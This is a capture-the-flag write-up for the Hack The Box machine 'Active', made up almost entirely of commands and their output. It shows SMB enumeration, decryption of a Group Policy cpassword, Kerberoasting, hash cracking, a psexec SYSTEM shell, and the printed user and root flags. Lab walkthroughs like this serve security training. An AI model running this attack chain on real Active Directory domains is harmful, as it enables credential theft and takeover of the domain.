# active: https://app.hackthebox.com/machines/Active

```bash
sudo nmap -sC -sV 10.10.10.100  

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-05-13 13:35:28Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   210: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-05-13T13:36:28
|_  start_date: 2023-05-13T13:31:12
```
```bash
cat /etc/hosts | grep  10.10.10.100
10.10.10.100	active.htb

```
```bash
enum4linux -a active.htb

==================================( Share Enumeration on active.htb )==================================

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Replication     Disk      
	SYSVOL          Disk      Logon server share 
	Users           Disk      

[+] Attempting to map shares on active.htb

//active.htb/ADMIN$	Mapping: DENIED Listing: N/A Writing: N/A
//active.htb/C$	Mapping: DENIED Listing: N/A Writing: N/A
//active.htb/IPC$	Mapping: OK Listing: DENIED Writing: N/A

//active.htb/SYSVOL	Mapping: N/A Listing: N/A Writing: N/A
//active.htb/Users	Mapping: DENIED Listing: N/A Writing: N/A
```
```bash
smbmap -H active.htb
[+] IP: active.htb:445	Name: unknown                                           
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	Replication                                       	READ ONLY	
	SYSVOL                                            	NO ACCESS	Logon server share 
	Users                                             	NO ACCESS	
```
```bash
smbclient -N //active.htb/Replication --option="client min protocol"=LANMAN1
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Jul 21 11:37:44 2018
  ..                                  D        0  Sat Jul 21 11:37:44 2018
  active.htb                          D        0  Sat Jul 21 11:37:44 2018

smb: \> cd active.htb\
smb: \active.htb\> dir
  .                                   D        0  Sat Jul 21 11:37:44 2018
  ..                                  D        0  Sat Jul 21 11:37:44 2018
  DfsrPrivate                       DHS        0  Sat Jul 21 11:37:44 2018
  Policies                            D        0  Sat Jul 21 11:37:44 2018
  scripts                             D        0  Wed Jul 18 19:48:57 2018

```
```bash
smb: \active.htb\> mget *
NT_STATUS_NO_SUCH_FILE listing \active.htb\*

smb: \active.htb\> recurse ON
smb: \active.htb\> prompt OFF
smb: \active.htb\> mget *
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (0.4 KiloBytes/sec) (average 0.2 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (5.5 KiloBytes/sec) (average 1.9 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (1.8 KiloBytes/sec) (average 1.9 KiloBytes/sec)
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (2.3 KiloBytes/sec) (average 2.0 KiloBytes/sec)
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (6.5 KiloBytes/sec) (average 2.9 KiloBytes/sec)

```

```bash
cat ~/…/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml

<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```
```bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

GPPstillStandingStrong2k18
```

```bash
evil-winrm -i active.htb -u SVC_TGS -p GPPstillStandingStrong2k18
```
```bash
impacket-GetADUsers active.htb/SVC_TGS:GPPstillStandingStrong2k18 -all 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Querying active.htb for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2018-07-18 20:06:40.351723  2023-05-13 14:32:20.858555 
Guest                                                 <never>              <never>             
krbtgt                                                2018-07-18 19:50:36.972031  <never>             
SVC_TGS                                               2018-07-18 21:14:38.402764  2018-07-21 15:01:30.320277 
```
```bash
impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 20:06:40.351723  2023-05-13 14:32:20.858555             

[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$c59a91c6fabee637df4900a27a8fdfa8$907cf95c3c376cb3cded4d221a60854bef2fd1d496c447cf9434b73f711ea93214e8ff0acd4c55e89f31daea175e7888fe684a0edb6c4ea303ff12ff75c8fa43b48d865497f80622410dc5c69ab9522e33e662bfdfa25c90df631c539bf8b4d82bbda70369122776eb5a4dc9037de2426bcd21314f88641496e67139cdb40bd487178782882a624372ee4f62c91f7474ca81cc79f127c802a0336ad77cd5d0b3dfd2066f610fe9118bddcd86ab2585399de3b99bc70058d83ceab28361e4ce9666e6fb321999170b3e8f0e4baf7acb22e36271b5e0d868878024b35069d274442a654144f267d847a6b62903cfa4dfd197206b4e0e8693cf0856367088df3950418145abfb5b9b9ea3d09f9aa943bd3349e7d9fc8f1a5806b4df327f35664e09a98d604421ad1a5f6d010b069a41296d22dd06e93b4a3679fe7aef94618981d4b6375a4885199e624a96d9a358ae2369e01422558d3c52eaff8b5235d23496749c31e70db3b3f8235ffaab8248889adfc37578cf6cf942b61285c9adaad52f4eec5121b36ff397d47937d5bbb0753332b33590ae4750563f76d58358b96354f6e19e707bd9502a7d9e42ee43666c7b3fa05b6d013b8872d5a597b505e70a4c1a4f98057d62c3be2c0305ff169f69d31b11c7eef064a16d3d88e797a6df54644c5612ecd464f4db417338822d0e5860dcdcc55323184a6a2577cebf4a9d0302f1aa4bc8d7446b19345f0f98baee036c1b280f947f633aaaadef73776d22c16f88029efc9d1edc737be0a345212eee4284889752aef33e5fa2c2cae230c5aa146efe338985c8c4be3906100d37484917a1ebd0bedae0624d63666de81d039b8d0723805c97af7a0eeb8b18e35e8968b8d9eb85f9ff74e647f822b15e81eab60fed7d0f1eb68daf8327cac87475fd8f43b9f5741010854112d131871e4382fe82efefbf0511c13212568f56b2b96c00ad7a083ff86527c1f1629b4e25131d126fddb619fe7ba13e01195b899cbd60ab51a56c0fed9935e142337827d3bd5d1f1fd566b7ee04f3aab02292cabc3accab506ba59fdd687d4820ba37a949cf9859b4375aa2dff9eff154303cfcd1dab9150d73ad18b952b14d9db3b519a321fe314139ce0d3eec1ebd1b90043bdb53076f244703bd70e4594d92dfc828a26d305a44d35aea8d89d72d6fad12cc7e42aa4551b7dd67615808a08e86d82bc62bd0dabf20b2a7cdc159428a5c4a894345415c85de93ee31f0b03d185fc7b9

```
```bash
cat creds                                                                              
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$c59a91c6fabee637df4900a27a8fdfa8$907cf95c3c376cb3cded4d221a60854bef2fd1d496c447cf9434b73f711ea93214e8ff0acd4c55e89f31daea175e7888fe684a0edb6c4ea303ff12ff75c8fa43b48d865497f80622410dc5c69ab9522e33e662bfdfa25c90df631c539bf8b4d82bbda70369122776eb5a4dc9037de2426bcd21314f88641496e67139cdb40bd487178782882a624372ee4f62c91f7474ca81cc79f127c802a0336ad77cd5d0b3dfd2066f610fe9118bddcd86ab2585399de3b99bc70058d83ceab28361e4ce9666e6fb321999170b3e8f0e4baf7acb22e36271b5e0d868878024b35069d274442a654144f267d847a6b62903cfa4dfd197206b4e0e8693cf0856367088df3950418145abfb5b9b9ea3d09f9aa943bd3349e7d9fc8f1a5806b4df327f35664e09a98d604421ad1a5f6d010b069a41296d22dd06e93b4a3679fe7aef94618981d4b6375a4885199e624a96d9a358ae2369e01422558d3c52eaff8b5235d23496749c31e70db3b3f8235ffaab8248889adfc37578cf6cf942b61285c9adaad52f4eec5121b36ff397d47937d5bbb0753332b33590ae4750563f76d58358b96354f6e19e707bd9502a7d9e42ee43666c7b3fa05b6d013b8872d5a597b505e70a4c1a4f98057d62c3be2c0305ff169f69d31b11c7eef064a16d3d88e797a6df54644c5612ecd464f4db417338822d0e5860dcdcc55323184a6a2577cebf4a9d0302f1aa4bc8d7446b19345f0f98baee036c1b280f947f633aaaadef73776d22c16f88029efc9d1edc737be0a345212eee4284889752aef33e5fa2c2cae230c5aa146efe338985c8c4be3906100d37484917a1ebd0bedae0624d63666de81d039b8d0723805c97af7a0eeb8b18e35e8968b8d9eb85f9ff74e647f822b15e81eab60fed7d0f1eb68daf8327cac87475fd8f43b9f5741010854112d131871e4382fe82efefbf0511c13212568f56b2b96c00ad7a083ff86527c1f1629b4e25131d126fddb619fe7ba13e01195b899cbd60ab51a56c0fed9935e142337827d3bd5d1f1fd566b7ee04f3aab02292cabc3accab506ba59fdd687d4820ba37a949cf9859b4375aa2dff9eff154303cfcd1dab9150d73ad18b952b14d9db3b519a321fe314139ce0d3eec1ebd1b90043bdb53076f244703bd70e4594d92dfc828a26d305a44d35aea8d89d72d6fad12cc7e42aa4551b7dd67615808a08e86d82bc62bd0dabf20b2a7cdc159428a5c4a894345415c85de93ee31f0b03d185fc7b9
```
```bash
john creds --wordlist=/usr/share/wordlists/rockyou.txt                     
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)     
```
```bash
impacket-psexec administrator@active.htb  
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[*] Requesting shares on active.htb.....
[*] Found writable share ADMIN$
[*] Uploading file tdKRYLcH.exe
[*] Opening SVCManager on active.htb.....
[*] Creating service dNij on active.htb.....
[*] Starting service dNij.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```
```bash
C:\Users\SVC_TGS\Desktop> type user.txt
fefd3b784a38498de7b4e974ca0c0e0d
```
```bash
C:\Users\Administrator\Desktop> type root.txt
dc680044f476fd07e406aa0b0c792824
```
